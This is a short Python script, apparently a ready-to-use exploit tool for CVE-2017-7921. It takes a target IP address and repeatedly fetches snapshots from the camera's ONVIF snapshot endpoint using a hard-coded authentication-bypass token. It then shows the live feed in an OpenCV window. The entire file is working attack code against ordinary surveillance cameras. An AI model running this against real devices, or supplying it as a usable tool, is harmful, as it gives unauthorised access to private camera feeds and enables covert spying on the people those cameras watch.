"""show camera that can be exploited by CVE-2017-7921"""
import requests
import argparse

import cv2
import numpy as np


def get_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', type=str, required=True, help='the target that to be displayed')
    parser.add_argument('--x', type=int, default=0, required=False, help='window location x')
    parser.add_argument('--y', type=int, default=0, required=False, help='window location y')
    parser.add_argument('--height', type=int, default=640, required=False, help='window height')

    args = parser.parse_args()
    return args


def show(args):
    win_name = args.ip + "(cve-2017-7921)"
    cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)
    cv2.moveWindow(win_name, args.x, args.y)  # window location

    while True:
        try:
            r = requests.get(f"http://{args.ip}/onvif-http/snapshot?auth=YWRtaW46MTEK", timeout=3)
            img = cv2.imdecode(np.frombuffer(r.content, 'uint8'), 1)

            # resize
            scale = args.height / img.shape[0]
            img = cv2.resize(img, None, fx=scale, fy=scale, interpolation=cv2.INTER_AREA)

            cv2.imshow(win_name, img)
            if cv2.waitKey(30) == ord('q'): # wait 30 ms for 'q' input
                cv2.destroyAllWindows()
                break
        except Exception as e:
            pass


if __name__ == '__main__':
    args = get_parser()
    show(args)
